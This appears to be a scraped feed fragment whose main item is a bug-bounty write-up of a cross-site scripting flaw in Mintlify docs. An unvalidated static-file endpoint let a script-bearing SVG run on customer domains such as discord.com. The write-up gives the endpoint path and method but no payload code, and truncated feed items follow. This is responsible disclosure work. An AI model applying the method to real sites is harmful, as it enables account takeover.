<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/60828015/523279902-58ed99c4-ba37-4e6a-a782-3004ac12ab96.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMyNzk5MDItNThlZDk5YzQtYmEzNy00ZTZhLWE3ODItMzAwNGFjMTJhYjk2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI3YzExNzk2ODc5NGE0OTI2NTQ5NDU3MzdkYTIxYTYzZDhmNDQ2OGVmMDMyNmVjMDYzMGExMmVlODljOThkNTYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.3ila-RylcwUQ2XON2bTtUhpqkO4dfN2R3_1qcDmtYHk"><img width="400" height="216" alt="image" src="https://private-user-images.githubusercontent.com/60828015/523279902-58ed99c4-ba37-4e6a-a782-3004ac12ab96.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMyNzk5MDItNThlZDk5YzQtYmEzNy00ZTZhLWE3ODItMzAwNGFjMTJhYjk2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI3YzExNzk2ODc5NGE0OTI2NTQ5NDU3MzdkYTIxYTYzZDhmNDQ2OGVmMDMyNmVjMDYzMGExMmVlODljOThkNTYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.3ila-RylcwUQ2XON2bTtUhpqkO4dfN2R3_1qcDmtYHk"></a>
<p dir="auto">Discord is one of my favorite places to hunt for vulnerabilities since I'm very familiar with their API and platform. I'm at the top of their bug bounty leaderboard having reported nearly 100 vulnerabilities over the last few years. After you've gone through every feature at least 10 times, it gets boring.</p>
<p dir="auto">I found this new update exciting, and as soon as I saw the announcement, I started looking through how they implemented this new documentation platform.</p>
<p dir="auto"><h2 dir="auto">Mintlify</h2><a id="user-content-mintlify" aria-label="Permalink: Mintlify" href="#mintlify"></a></p>
<p dir="auto">Mintlify is an AI-powered documentation platform. You write your documentation as markdown and Mintlify turns it into a beautiful documentation platform with all the modern features a documentation platform needs. (Despite the vulnerabilities we found, I would highly recommend them. They make it really easy to create beautiful docs that work.)</p>
<p dir="auto">Mintlify-hosted documentation sites are on the *.mintlify.app domains, with support for custom domains. In Discord's case, they were just proxying certain routes to their Mintlify documentation at <code>discord.mintlify.app</code>.</p>
<p dir="auto">Every Mintlify subdomain has a <code>/_mintlify/*</code> path that is used internally on the platform to power certain features. Regardless of whether it's hosted through the <code>mintlify.app</code> domain or a custom domain, the <code>/_mintlify</code> path must be accessible to power the documentation.
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/60828015/523285391-4cca3f2c-52ce-4d9c-a713-3d6a4d8e1b9b.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMyODUzOTEtNGNjYTNmMmMtNTJjZS00ZDljLWE3MTMtM2Q2YTRkOGUxYjliLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWE4YTc2OWYxZTkxNGZkYzc4Nzg1NjFjNzNjYzhjNDc0OWYxNTc1YmNkNTdmMmZhZTAzOTYwOWI2ZjBmMzZiODEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.CnmZ9OynarFqQ5gaimAeigarY_voitFycXZJPs1ggK8"><img width="672" height="167" alt="image" src="https://private-user-images.githubusercontent.com/60828015/523285391-4cca3f2c-52ce-4d9c-a713-3d6a4d8e1b9b.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMyODUzOTEtNGNjYTNmMmMtNTJjZS00ZDljLWE3MTMtM2Q2YTRkOGUxYjliLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWE4YTc2OWYxZTkxNGZkYzc4Nzg1NjFjNzNjYzhjNDc0OWYxNTc1YmNkNTdmMmZhZTAzOTYwOWI2ZjBmMzZiODEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.CnmZ9OynarFqQ5gaimAeigarY_voitFycXZJPs1ggK8"></a></p>
<p dir="auto">(For example, the <code>/api/user</code> path for authentication: <a href="https://docs.x.com/_mintlify/api/user" rel="nofollow">https://docs.x.com/_mintlify/api/user</a>, <a href="https://discord.com/_mintlify/api/user" rel="nofollow">https://discord.com/_mintlify/api/user</a>, etc)</p>
<p dir="auto"><h2 dir="auto"><code>/_mintlify/markdown/</code></h2><a id="user-content-_mintlifymarkdown" aria-label="Permalink: /_mintlify/markdown/" href="#_mintlifymarkdown"></a></p>
<p dir="auto">After Discord switched to Mintlify and when I started looking for bugs on the platform, from the get-go, my plan was to find a way to render another Mintlify documentation through Discord's domain.</p>
<p dir="auto">At first, I tried path traversal attacks, but they didn't work. Then, I started looking through the <code>/_mintlify</code> API endpoints.</p>
<p dir="auto">Using Chrome DevTools to search the assets, I found the endpoint <code>/_mintlify/_markdown/_sites/[subdomain]/[...route]</code>. It accepted any Mintlify documentation (<code>[subdomain]</code>) and it returned a file from that specific documentation (<code>[...route]</code>). The endpoint didn't check to make sure the <code>[subdomain]</code> matched with the current host, which means you could fetch files from any Mintlify documentation on an host with the <code>/_mintlify/</code> route.</p>
<p dir="auto">Unfortunately, this endpoint only returned raw markdown text. The markdown wasn't rendered as HTML, meaning it was impossible to run code. I spent the rest of the time trying different ways to bypass this, but nothing worked.</p>
<p dir="auto"><h2 dir="auto"><code>/_mintlify/static/</code></h2><a id="user-content-_mintlifystatic" aria-label="Permalink: /_mintlify/static/" href="#_mintlifystatic"></a></p>
<p dir="auto">Fast forward 2 days to Sunday, November 9, 2025, I went back to hunting.</p>
<p dir="auto">I was confident there was another endpoint, like the markdown one, which could fetch and return cross-site data, but I couldn't find one. I tried searching web assets and some other techniques, but I couldn't find the endpoint I was looking for.</p>
<p dir="auto">Finally, I decided to look through the Mintlify CLI. Mintlify lets you run your documentation site locally via their npm package (@mintlify/cli). I realized that this probably meant the code powering the documentation platform was somewhat public.</p>
<p dir="auto">After digging through the package and downloading tarballs linked in the code, I found myself at exactly what I was looking for.</p>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/60828015/523295339-700c1c7d-69da-440e-8022-4a9f59902871.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMyOTUzMzktNzAwYzFjN2QtNjlkYS00NDBlLTgwMjItNGE5ZjU5OTAyODcxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTY4MTgxYThlYmM5Zjk0NWZjMGViYTI0ZWM0YzlmNjEwMGFmZTk3OTQ3ZWE3NGNhN2ExODE2NmRhNGExZTA5ZjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pREXmwFtkcEZaGKWAgnBXHuga5OOCScvUC6teAuIN5s"><img width="2000" height="1548" alt="image" src="https://private-user-images.githubusercontent.com/60828015/523295339-700c1c7d-69da-440e-8022-4a9f59902871.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMyOTUzMzktNzAwYzFjN2QtNjlkYS00NDBlLTgwMjItNGE5ZjU5OTAyODcxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTY4MTgxYThlYmM5Zjk0NWZjMGViYTI0ZWM0YzlmNjEwMGFmZTk3OTQ3ZWE3NGNhN2ExODE2NmRhNGExZTA5ZjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pREXmwFtkcEZaGKWAgnBXHuga5OOCScvUC6teAuIN5s"></a>
<p dir="auto">Jackpot!</p>
<p dir="auto">This was a list of application endpoints (compiled by Nextjs), and in the middle, there's the endpoint <code>/_mintlify/static/[subdomain]/[...route]</code>.</p>
<p dir="auto">Like the markdown endpoint, this endpoint accepted any Mintlify documentation (<code>[subdomain]</code>). The only difference was this endpoint returned static files from the documentation repo.</p>
<p dir="auto">First, I tried accessing HTML and JavaScript files but it didn't work; I realized there was some sort of whitelist of file extensions. Then, I tried an SVG file, and it worked.</p>
<p dir="auto">If you didn't know, you can embed JavaScript into an SVG file. The script doesn't run unless the file is directly opened (you can't run scripts from (<code>&lt;img src="/image.svg"&gt;</code>). This is very common knowledge for security researchers.</p>
<p dir="auto">I created an SVG file with an embedded script, uploaded it to my Mintlify documentation, and opened the endpoint through Discord (<a href="https://discord.com/_mintlify/_static/hackerone-a00f3c6c/lmao.svg" rel="nofollow">https://discord.com/_mintlify/_static/hackerone-a00f3c6c/lmao.svg</a>). It worked!
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/60828015/523299352-256777fb-9d84-4a4b-b847-3261e00d398d.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMyOTkzNTItMjU2Nzc3ZmItOWQ4NC00YTRiLWI4NDctMzI2MWUwMGQzOThkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWE1OTM2MmMwY2I1NDQxZGMxMTlmMDYzM2RhOTcxYmU2MWFmMWFhZjA1NzYzMWRiMmVjYzE4OWQ0YTRlZWNhMzkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.7MSTzg4ooMNuJvblDyKgkihrTnaAYjwvPIkpVQaFsFY"><img width="960" height="322" alt="image" src="https://private-user-images.githubusercontent.com/60828015/523299352-256777fb-9d84-4a4b-b847-3261e00d398d.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMyOTkzNTItMjU2Nzc3ZmItOWQ4NC00YTRiLWI4NDctMzI2MWUwMGQzOThkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWE1OTM2MmMwY2I1NDQxZGMxMTlmMDYzM2RhOTcxYmU2MWFmMWFhZjA1NzYzMWRiMmVjYzE4OWQ0YTRlZWNhMzkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.7MSTzg4ooMNuJvblDyKgkihrTnaAYjwvPIkpVQaFsFY"></a></p>
<p dir="auto"><h2 dir="auto">Collaboration</h2><a id="user-content-collaboration" aria-label="Permalink: Collaboration" href="#collaboration"></a></p>
<p dir="auto">XSS attacks are incredibly rare on Discord, so I shared it with a couple friends.</p>
<p dir="auto">I sent a screenshot to xyzeva, only to find out she had also been looking into Mintlify after the Discord switch. She had previously discovered other vulnerabilities on the Mintlify platform, and had found more that she was preparing to disclose (<a href="https://kibty.town/blog/mintlify/" rel="nofollow">go read her writeup!</a>). I find it funny we had both separately been looking into Mintlify and found very different, but very critical bugs.</p>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/60828015/527263164-783c899c-5e85-4aad-8303-c0fccc3c7b4e.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjcyNjMxNjQtNzgzYzg5OWMtNWU4NS00YWFkLTgzMDMtYzBmY2NjM2M3YjRlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU0ZmIyY2E4YzU4M2YwYWVlOGU1MGE5NDdjNjIxYzNlOTBkNTA4YTY4MTNiOGIyMTlmYjIxODFiZDFhYjZhM2UmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.uAtbLoX0e0qdCSJwhMFZ3rmW4v35C4MQo1e7gWeT12s"><img width="505" height="315" alt="image" src="https://private-user-images.githubusercontent.com/60828015/527263164-783c899c-5e85-4aad-8303-c0fccc3c7b4e.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjcyNjMxNjQtNzgzYzg5OWMtNWU4NS00YWFkLTgzMDMtYzBmY2NjM2M3YjRlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU0ZmIyY2E4YzU4M2YwYWVlOGU1MGE5NDdjNjIxYzNlOTBkNTA4YTY4MTNiOGIyMTlmYjIxODFiZDFhYjZhM2UmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.uAtbLoX0e0qdCSJwhMFZ3rmW4v35C4MQo1e7gWeT12s"></a>
<p dir="auto">Another friend joined, and we created a group chat.</p>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/60828015/525738216-ce48ea02-e88b-4c90-b121-554fd9590f6a.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjU3MzgyMTYtY2U0OGVhMDItZTg4Yi00YzkwLWIxMjEtNTU0ZmQ5NTkwZjZhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFlNGI1NGNiNTY5MWRjNGI5YTBkZjRhMzJlY2Q0NDA3OWM4YTViYWE0YmUwYWVmN2FjZWYwMWM2M2VmZmZkNTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.NcOMZ8MFYqytnDSU5olvKyTIq6vuz6xRtwG0YD5W0FY"><img width="256" height="147" alt="image" src="https://private-user-images.githubusercontent.com/60828015/525738216-ce48ea02-e88b-4c90-b121-554fd9590f6a.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjU3MzgyMTYtY2U0OGVhMDItZTg4Yi00YzkwLWIxMjEtNTU0ZmQ5NTkwZjZhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFlNGI1NGNiNTY5MWRjNGI5YTBkZjRhMzJlY2Q0NDA3OWM4YTViYWE0YmUwYWVmN2FjZWYwMWM2M2VmZmZkNTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.NcOMZ8MFYqytnDSU5olvKyTIq6vuz6xRtwG0YD5W0FY"></a>
<p dir="auto"><h2 dir="auto">Reporting</h2><a id="user-content-reporting" aria-label="Permalink: Reporting" href="#reporting"></a></p>
<p dir="auto">We reported the vulnerability to Discord and attempted to contact Mintlify through an employee.</p>
<p dir="auto">Discord took this very seriously, and closed off its entire developer documentation for 2 hours while investigating the impact of this vulnerability. Then, they reverted to their old documentation platform and removed all the Mintlify routes.
<a href="https://discordstatus.com/incidents/by04x5gnnng3" rel="nofollow">https://discordstatus.com/incidents/by04x5gnnng3</a></p>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/60828015/523303432-780d56bc-7493-48bf-9b0e-4005bd3bac11.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMzMDM0MzItNzgwZDU2YmMtNzQ5My00OGJmLTliMGUtNDAwNWJkM2JhYzExLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThjMWRlYWJjNDliODFlNzMxOGFlYmMwYTcyYjJlNmE0NzM3NTAwZTlhYTVlMmE2NzEzMTUzMDFhMDE0YmIyZmQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Szi_zF2Uv8xdYA-NS48TLEu7GNU7-Z9bicRWd2kkcgs"><img width="284" height="162" alt="image" src="https://private-user-images.githubusercontent.com/60828015/523303432-780d56bc-7493-48bf-9b0e-4005bd3bac11.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYwOTAxMDEsIm5iZiI6MTc2NjA4OTgwMSwicGF0aCI6Ii82MDgyODAxNS81MjMzMDM0MzItNzgwZDU2YmMtNzQ5My00OGJmLTliMGUtNDAwNWJkM2JhYzExLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjE4VDIwMzAwMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThjMWRlYWJjNDliODFlNzMxOGFlYmMwYTcyYjJlNmE0NzM3NTAwZTlhYTVlMmE2NzEzMTUzMDFhMDE0YmIyZmQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Szi_zF2Uv8xdYA-NS48TLEu7GNU7-Z9bicRWd2kkcgs"></a>
<p>
Mintlify contacted us directly very shortly after hearing about the vulnerability through Discord. We set up a Slack channel with Mintlify's engineering team and got to work. Personally, this cross-site scripting attack was the only thing I had the time to find; eva and MDL worked with Mintlify's engineering team to quickly remediate this and other vulnerabilities they found on the platform.</p>
<p dir="auto"><h2 dir="auto">Impact</h2><a id="user-content-impact" aria-label="Permalink: Impact" href="#impact"></a></p>
<p dir="auto">In total, the cross-site scripting attack affected almost every Mintlify customer. To name a few: X (Twitter), Vercel, Cursor, Discord, <a href="https://mintlify.com/customers" rel="nofollow">and more</a>.</p>
<p dir="auto">These customers host their documentation on their primary domains and were vulnerable to account takeovers with a single malicious link.</p>
<p dir="auto"><h2 dir="auto">Conclusion</h2><a id="user-content-conclusion" aria-label="Permalink: Conclusion" href="#conclusion"></a></p>
<p dir="auto">Fortunately, we responsibly found and disclosed this vulnerability but this is an example of how compromising a single supply chain can lead to a multitude of problems.</p>
<p dir="auto">In total, we collectively recieved ~$11,000 in bounties. Discord paid $4,000 and Mintlify individually gave us bounties for the impact of the bugs we individually found.</p>
</article>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How China built its ‘Manhattan Project’ to rival the West in AI chips (346 pts)]]></title>
            <link>https://www.japantimes.co.jp/business/2025/12/18/tech/china-west-ai-chips/</link>
            <guid>46316907</guid>
            <pubDate>Thu, 18 Dec 2025 18:55:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.japantimes.co.jp/business/2025/12/18/tech/china-west-ai-chips/">https://www.japantimes.co.jp/business/2025/12/18/tech/china-west-ai-chips/</a>, See on <a href="https://news.ycombinator.com/item?id=46316907">Hacker News</a></p>
Couldn't get https://www.japantimes.co.jp/business/2025/12/18/tech/china-west-ai-chips/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[FunctionGemma 270M Model (201 pts)]]></title>
            <link>https://blog.google/technology/developers/functiongemma/</link>
            <guid>46316533</guid>
            <pubDate>Thu, 18 Dec 2025 18:26:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.google/technology/developers/functiongemma/">https://blog.google/technology/developers/functiongemma/</a>, See on <a href="https://news.ycombinator.com/item?id=46316533">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>

    
    





    

    
      








<div data-analytics-module="{
    &quot;module_name&quot;: &quot;Hero Menu&quot;,
    &quot;section_header&quot;: &quot;FunctionGemma: Bringing bespoke function calling to the edge&quot;
  }">
  
  <div>
      
      
        <p>
          We’re releasing a specialized version of our Gemma 3 270M model fine-tuned for function calling and a training recipe for users to specialize for even better performance.
        </p>
      
    </div>
  
  <div>
  <p>Ravin Kumar</p>
  
    <p>
      Research Engineer
    </p>
  
  
</div>
</div>

    

    
      










<div>
    <figure>
      <div>
        <p><img alt="FunctionGemma Logo text" data-component="uni-progressive-image" fetchpriority="high" height="150px" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/FunctionGemma-Keyword_RD1-V01.width-200.format-webp.webp" width="360px" data-sizes="(max-width: 1023px) 100vw,(min-width: 1024px and max-width: 1259) 80vw, 1046px" data-srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/FunctionGemma-Keyword_RD1-V01.width-800.format-webp.webp 800w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/FunctionGemma-Keyword_RD1-V01.width-1200.format-webp.webp 1200w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/FunctionGemma-Keyword_RD1-V01.width-1600.format-webp.webp 1600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/FunctionGemma-Keyword_RD1-V01.width-2200.format-webp.webp 2200w">
        </p>
      </div>
      
    </figure>
  </div>






    

    
    <div data-reading-time="true" data-component="uni-article-body">

            
  
    
    
    
    

    <uni-article-speakable page-title="FunctionGemma: Bringing bespoke function calling to the edge" listen-to-article="Listen to article" data-date-modified="2025-12-18T18:00:59.275665+00:00" data-tracking-ids="G-HGNBTNCHCQ,G-6NKTLKV14N" data-voice-list="en.ioh-pngnat:Cyan,en.usb-pngnat:Lime" data-script-src="https://www.gstatic.com/readaloud/player/web/api/js/api.js" data-highlight-mode="word-over-paragraph"></uni-article-speakable>
  





            
            
<!--article text-->

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;FunctionGemma: Bringing bespoke function calling to the edge&quot;
